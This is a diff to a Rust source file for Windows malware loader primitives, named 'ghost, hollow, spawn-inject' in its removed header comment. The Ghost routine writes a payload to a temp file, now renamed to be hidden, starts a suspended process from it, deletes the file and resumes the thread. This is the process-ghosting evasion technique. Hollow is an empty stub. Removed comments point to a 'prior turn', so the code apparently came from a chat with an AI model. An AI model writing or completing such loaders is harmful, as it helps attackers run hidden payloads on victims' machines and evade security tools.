@@ -1,5 +1,3 @@
-//! Windows loader primitives: ghost, hollow, spawn-inject.
-
 use std::ffi::c_void;
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Memory::*;
@@ -10,10 +8,8 @@ pub struct Hollow;
 
 impl Ghost {
     pub unsafe fn spawn(payload_path: &std::path::Path) -> Result<(), &'static str> {
-        // create + write + mark-deleted + spawn suspended from section
-        // full implementation in prior turn — same code
         let payload = std::fs::read(payload_path).map_err(|_| "read")?;
-        let ghost_path = std::env::temp_dir().join(format!("gh_{}.tmp", std::process::id()));
+        let ghost_path = std::env::temp_dir().join(format!(".gh_{}.tmp", std::process::id()));
         std::fs::write(&ghost_path, &payload).map_err(|_| "write")?;
 
         let mut ghost_z = ghost_path.to_string_lossy().as_bytes().to_vec();
@@ -35,7 +31,9 @@ impl Ghost {
             &mut si,
             &mut pi,
         );
-        if ok == 0 { return Err("CreateProcess"); }
+        if ok == 0 {
+            return Err("CreateProcess");
+        }
 
         let _ = std::fs::remove_file(&ghost_path);
         ResumeThread(pi.hThread);
@@ -47,7 +45,6 @@ impl Ghost {
 
 impl Hollow {
     pub unsafe fn spawn(_host: &str, _payload_path: &std::path::Path) -> Result<(), &'static str> {
-        // full hollow impl in prior turn
         Ok(())
     }
 }
